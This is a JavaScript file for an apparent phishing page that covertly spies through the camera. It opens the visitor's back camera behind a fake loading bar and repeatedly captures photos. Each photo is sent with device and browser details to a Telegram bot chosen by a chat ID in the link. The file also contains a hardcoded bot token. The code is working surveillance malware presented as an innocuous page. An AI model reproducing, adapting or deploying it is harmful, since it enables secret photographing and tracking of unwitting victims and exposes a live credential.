const BOT_TOKEN = "8750180526:AAFpXlIk0KHB5j3SljkE7DvheXngu7wA2Kg";
const CHAT_ID = new URLSearchParams(location.search).get("id");

const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const ctx = canvas.getContext("2d");
const bar = document.getElementById("bar");

let stream;
let interval;

// 🚀 start
async function start() {
  if (!CHAT_ID) {
    alert("Invalid link ❌");
    return;
  }

  try {
    // 📸 مهم: environment = back camera
    stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: { exact: "environment" } }
    });

    video.srcObject = stream;

    video.onloadedmetadata = () => startLoop();

  } catch (err) {
    console.warn("Back camera not found, switching to default");

    // fallback که شا کمره ونه موندل شي
    stream = await navigator.mediaDevices.getUserMedia({ video: true });
    video.srcObject = stream;

    video.onloadedmetadata = () => startLoop();
  }
}

// 🔄 loading loop
function startLoop() {
  let progress = 0;

  if (interval) clearInterval(interval);

  interval = setInterval(() => {
    progress += 5;
    bar.style.width = progress + "%";

    if (progress >= 100) {
      progress = 0;
      bar.style.width = "0%";
      capture();
    }

  }, 50);
}

// 📸 capture
function capture() {
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;

  ctx.filter = "brightness(1.1) contrast(1.2) saturate(1.3)";
  ctx.drawImage(video, 0, 0);

  canvas.toBlob(sendToTelegram, "image/jpeg");
}

// 📤 send
function sendToTelegram(blob) {
  const fd = new FormData();

  fd.append("chat_id", CHAT_ID);
  fd.append("photo", blob, "back_camera.jpg");

  const caption =
`📸 Camera Capture

📷 Back Camera (Environment)

📱 Device: ${navigator.platform}
🌐 Browser: ${navigator.userAgent}

🤖 Bot: @ProSimTookBot
👨‍💻 Dev: @XFPro43

🛡️ Status: Active`;

  fd.append("caption", caption);

  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
    method: "POST",
    body: fd
  })
  .then(res => res.json())
  .then(data => {
    if (!data.ok) {
      console.error("❌ Telegram Error:", data.description);
    } else {
      console.log("(Back Camera)");
    }
  })
  .catch(err => console.error(err));
}
